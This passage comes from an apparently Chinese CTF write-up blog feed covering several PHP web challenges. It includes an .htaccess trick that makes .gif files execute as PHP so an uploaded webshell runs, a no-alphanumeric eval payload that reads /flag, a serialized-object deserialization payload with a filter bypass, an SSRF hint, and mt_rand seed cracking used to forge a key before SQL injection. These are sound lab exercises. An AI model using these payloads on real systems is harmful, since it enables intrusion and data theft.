å…¥<code>.htaccess</code>æ–‡ä»¶æ¥è¦†ç›–é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®ï¼ˆ<code>.htaccess</code>æ–‡ä»¶ä½œç”¨æ‰€åœ¨çš„ç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ï¼ŒæŒ‡ä»¤æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆï¼Œæ‰€ä»¥å­ç›®å½•ä¸‹çš„<code>.htaccess</code>å¯èƒ½ä¼šè¦†ç›–çˆ¶ç›®å½•ä¸‹æˆ–è€…é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼‰      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>æ ‡ç­¾æ¯”<code>&lt;directory&gt;</code>ä¼˜å…ˆçº§é«˜     </p><p>ç„¶åä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶åç¼€åæ”¹ä¸º<code>.gif</code>      </p><p>èšå‰‘è¿ä¸Šä¹Ÿæ²¡ç”¨ï¼Œæœ‰<code>disable_function</code>,è®¿é—®ä¸€å¥è¯æ–‡ä»¶<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>å¯ä»¥<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>phpä»£ç å®¡è®¡   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>);     &#125;    <span class="hljs-keyword">eval</span>($code);&#125;</code></pre></code></pre><p>è¿‡æ»¤äº†å­—æ¯æ•°å­—è¿˜æœ‰<code>_@$</code>    </p><p>è¯•äº†ä¸‹å¼‚æˆ–ï¼Œä¸è¡Œï¼›urlå–åä¹Ÿä¸è¡Œï¼Œå°±æ²¡æ‹›äº†â€¦â€¦.      </p><p><code>é€šé…ç¬¦</code><br><code>/bin/cat /flag</code>â€”â€”-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡â€”Pç¥</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>åœç”µäº†ä¼šå‘ç”Ÿä»€ä¹ˆ    </p><p>æœªå®Œæˆçš„æ–‡ä»¶ï¼Œæç¤º<code>swp</code>æ³„éœ²ï¼Œå½“æ—¶çœ‹åˆ°è¿™å¥è¯æ²¡å•¥æ„Ÿè§‰ï¼Œæ‰¾äº†æ‰¾å…¶ä»–ä¹Ÿæ²¡å•¥ï¼Œå°±å»æ‰«ç›®å½•äº†      </p><p>æ‰«åˆ°<code>.index.php.swp</code>       </p><p>swpæ–‡ä»¶æ‹–åˆ°Linuxå›å¤ä¸€ä¸‹<code>vi -r .index.php.swp</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;        <span class="hljs-comment">// initialise variables</span>        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);            &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);        fclose($fd);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;    <span class="hljs-keyword">public</span> $weblogfile;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);        <span class="hljs-keyword">return</span> $str;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);$log_unser = unserialize($log);<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;&lt;br/&gt;æ˜¨å¤©æ™šä¸Šå› ä¸º<span class="hljs-number">14</span>çº§å¤§é£åœç”µäº†.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p><code>readfile</code>  ã€ flagåœ¨<code>/flag</code>      </p><p>é“¾<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>åªè¦å°†<code>$weblogfile=&#39;/flag&#39;</code>å³å¯       </p><p>flagè¿‡æ»¤äº†ï¼ŒåŒå†™å³å¯ç»•è¿‡    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> weblog();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>payloadï¼š<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);    session_start();    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span>($url)    &#123;    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)        &#123;            <span class="hljs-keyword">exit</span>();        &#125;            $ch = curl_init();            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_exec($ch);            curl_close($ch);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>SSRF    </p><p><code>åˆ©ç”¨gopheråè®®æ”»å‡»å·²çŸ¥ç”¨æˆ·åæ— å¯†ç çš„Mysql</code>  </p><p>ç®—äº†ï¼Œç¯å¢ƒä¹Ÿå…³äº†ï¼Œé™„ä¸Š<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">å®¸æå®éªŒå®¤çš„WP</a>    </p><p>è¿˜æœ‰ä¸€é“GOè¯­è¨€çš„é¢˜â€¦â€¦.å®Œå…¨ä¸æ‡‚â€¦..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;UploadHub&quot;&gt;&lt;a href=&quot;#UploadHub&quot; class=&quot;headerlink&quot; title=&quot;UploadHub&quot;&gt;&lt;/a&gt;UploadHub&lt;/h2&gt;&lt;p&gt;æ–‡ä»¶ä¸Šä¼ é¢˜&lt;br&gt;ç»™äº†æºç ï¼Œå…¶ä¸­æœ‰äº›é…ç½®æ–‡ä»¶çœ‹ä¸æ‡‚ï¼Œæ”¾å¼ƒäº†   &lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wicctf" scheme="http://lll-nnn.github.io/categories/CTF/wicctf/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="wicctf" scheme="http://lll-nnn.github.io/tags/wicctf/"/>
    
  </entry>
  
  <entry>
    <title>StrongestMind</title>
    <link href="http://lll-nnn.github.io/2021/05/10/BUU85/"/>
    <id>http://lll-nnn.github.io/2021/05/10/BUU85/</id>
    <published>2021-05-10T15:19:37.000Z</published>
    <updated>2021-05-10T15:41:06.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PY"><a href="#PY" class="headerlink" title="PY"></a>PY</h2><p>æ‰“å¼€ç¯å¢ƒ </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1dc.png"></p><p>pythonè„šæœ¬      </p><p>è¿˜ä¸ä¼šå†™ï¼Œç ”ç©¶ä¸‹å¤§ä½¬çš„      </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span>():</span>    s = requests.session()       <span class="hljs-comment">#ä¼šè¯ä¿æŒ</span>    url = <span class="hljs-string">&#x27;http://ee15b87d-2094-4459-97e9-6c7d3f88800d.node3.buuoj.cn/&#x27;</span>    match = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)  <span class="hljs-comment">#æ­£åˆ™åŒ¹é…   +ï¼šåŒ¹é…å‰é¢çš„è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡</span>    r = s.get(url)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):        sleep(<span class="hljs-number">0.1</span>)        <span class="hljs-built_in">str</span> = match.findall(r.text)[<span class="hljs-number">0</span>]        print(<span class="hljs-built_in">str</span>)        <span class="hljs-comment"># print(eval(str))</span>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span> : <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)&#125;   <span class="hljs-comment">#evalæ‰§è¡Œ</span>        r = s.post(url, data=data)        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span>        print(<span class="hljs-string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)))        <span class="hljs-comment"># print(r.text)</span>    print(r.text)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    count()</code></pre></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PY&quot;&gt;&lt;a href=&quot;#PY&quot; class=&quot;headerlink&quot; title=&quot;PY&quot;&gt;&lt;/a&gt;PY&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="python" scheme="http://lll-nnn.github.io/categories/CTF/python/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="python" scheme="http://lll-nnn.github.io/tags/python/"/>
    
    <category term="exp" scheme="http://lll-nnn.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>Ezaudit</title>
    <link href="http://lll-nnn.github.io/2021/05/08/BUU84/"/>
    <id>http://lll-nnn.github.io/2021/05/08/BUU84/</id>
    <published>2021-05-08T10:07:27.000Z</published>
    <updated>2021-05-08T10:34:07.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0"><a href="#0" class="headerlink" title="-0-)"></a>-0-)</h2><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e304316d-4424-4850-b53e-7392e0c5c05e.png" alt="01.png">     </p><p>é¢˜ç›®æ‰“å¼€æ˜¯è¿™æ ·ï¼ŒæŒºæ­£ç»çš„ï¼Œä»¥ä¸ºæ˜¯ä»€ä¹ˆæ¼æ´ï¼Œæºç ä¸­ä¹Ÿæ²¡æœ‰æç¤º     </p><p>çœ‹ä¸€çœ¼é¢˜ç›®å<code>Ezaudit</code>ç®€å•çš„å®¡è®¡     </p><p>å“¦   </p><p><code>www.zip</code>  </p><p>æœç„¶   </p><p>ä¸‹è½½ä¸‹æ¥æ˜¯<code>index.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;        <span class="hljs-comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;        <span class="hljs-keyword">exit</span>;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )    &#123;        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;        <span class="hljs-keyword">exit</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>;         $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);        $result = mysql_query($getuser);        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;        &#125;    &#125;    &#125;&#125; <span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;  &#125;  <span class="hljs-comment">//genarate private_key</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;  &#125;  $Public_key = public_key();  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></code></pre></code></pre><p>é¦–å…ˆè¦è·å–åˆ°<code>private_key</code>    </p><p>ä¹‹å‰ä¹Ÿåšè¿‡ä¸€é“<code>mt_rand</code>çš„é¢˜ç›®ï¼Œé‚£ä¸€é“æ˜¯æ ¹æ®å‰å‡ ä½å¾—åˆ°<code>seed</code>      </p><p>è¿™æ¬¡ç”¨<code>public_key</code>å¾—åˆ°<code>seed</code>è¿™ä¸¤ä¸ªåº”è¯¥æ˜¯åŒä¸€ä¸ª<code>seed</code>å§   </p><p>ä¸è¿‡è¿™æ¬¡ç”¨ä¹‹å‰çš„è„šæœ¬è½¬æ¢æ—¶çˆ†ä¸å‡ºæ¥     </p><p>æ‰¾äº†ä¸€ä¸ªæ–°çš„è„šæœ¬     </p><p>å‘ç°å°‘äº†ä¸€ä½ï¼Œæˆ‘ä¹‹å‰é‚£é“é¢˜æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ï¼ï¼ï¼ï¼Ÿï¼Ÿï¼Ÿ   </p><p>PHPç‰ˆï¼š     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;$str=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;$result=<span class="hljs-string">&#x27;&#x27;</span>;$len1=strlen($pass);$len2=strlen($str)<span class="hljs-number">-1</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len1;$i++)&#123;    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;$len2+<span class="hljs-number">1</span>;$j++)    &#123;        <span class="hljs-keyword">if</span>($pass[$i]===$str[$j])        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$j</span> <span class="hljs-subst">$j</span> 0 <span class="hljs-subst">$len2</span> &quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>pythonç‰ˆï¼š    </p><pre><code><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>key = <span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>m = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):        <span class="hljs-keyword">if</span> i == s[j]:            m += <span class="hljs-string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(j,j,<span class="hljs-built_in">len</span>(s)<span class="hljs-number">-1</span>)print(m)</code></pre></code></pre><p>è½¬æ¢åçš„ç»“æœï¼š      </p><pre><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61      </code></pre><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/bd326a1b-2d71-4537-b51c-fdfe509f1aaa.png" alt="02.png">      </p><p>æ³¨æ„è¿™é‡Œçš„PHPç‰ˆæœ¬ä¸º<code>5.2.1 to 7.0.x</code>å¦‚æœç‰ˆæœ¬ä¸å¯¹çš„è¯ï¼Œç”Ÿæˆçš„ä¹Ÿä¸ä¸€æ ·ã€‚</p><p>é‡æ–°ç”Ÿæˆ<code>private_key</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">1775196155</span>);<span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>)</span><span class="hljs-function"></span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;&#125;<span class="hljs-comment">//genarate private_key</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>)</span><span class="hljs-function"></span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;&#125;<span class="hljs-keyword">echo</span> public_key().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> private_key();</code></pre></code></pre><p>å¾—åˆ°ï¼š     </p><pre><code>KVQP0LdJKRaV3n9DXuNhoueCDCGc   </code></pre><p>sqlä¸‡èƒ½å…¬å¼å¾—åˆ°flagï¼š     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/654d7ca9-db67-400a-b992-0afefb8809be.png" alt="03.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0&quot;&gt;&lt;a href=&quot;#0&quot; class=&quot;headerlink&quot; title=&quot;-0-)&quot;&gt;&lt;/a&gt;-0-)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.c</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="mt_srand" scheme="http://lll-nnn.github.io/tags/mt-srand/"/>
    
  </entry>
  
  <entry>
    <title>Bestphp&#39;s Revenge</title>
    <link href="http://lll-nnn.github.io/2021/05/06/BUU83/"/>
    <id>http://lll-nnn.github.io/2021/05/06/BUU83/</id>
    <published>2021-05-06T15:28:04.000Z</published>
    <updated>2021-05-07T15:34:01.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul><li>PHPä¸­SESSIONååºåˆ—åŒ–   <ul><li>PHPä¸­çš„sessionä¸­çš„å†…å®¹æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨çš„ï¼Œå¹¶ä¸æ˜¯å­˜äºå†…å­˜ä¸­ï¼Œå­˜å‚¨æ–¹å¼ç”±é…ç½®é¡¹<code>session.save_handler</code>æ§åˆ¶ï¼Œé»˜è®¤æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶ä»¥sess_sessionidè¿›è¡Œå‘½åï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯sessionå€¼åºåˆ—åŒ–åçš„å†…å®¹</li><li>åœ¨<code>php.ini</code>ä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®ï¼š</li><li><code>session.save_path=&quot;&quot;</code>   â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„     </li><li><code>session.save_handler=&quot;&quot; </code>â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)       </li><li><code>session.serialize_handler   string</code> â€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤æ˜¯php(5.5.4åæ”¹ä¸ºphp_serialize)    </li><li><code>session.serialize_handler</code>å­˜åœ¨ä¸‰ç§æ¨¡å¼   </li><li><code>php_binary</code>â€”&gt;é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e340b98b-eff6-43b5-b50a-ab8ee414d4f3.png" alt="03.png">        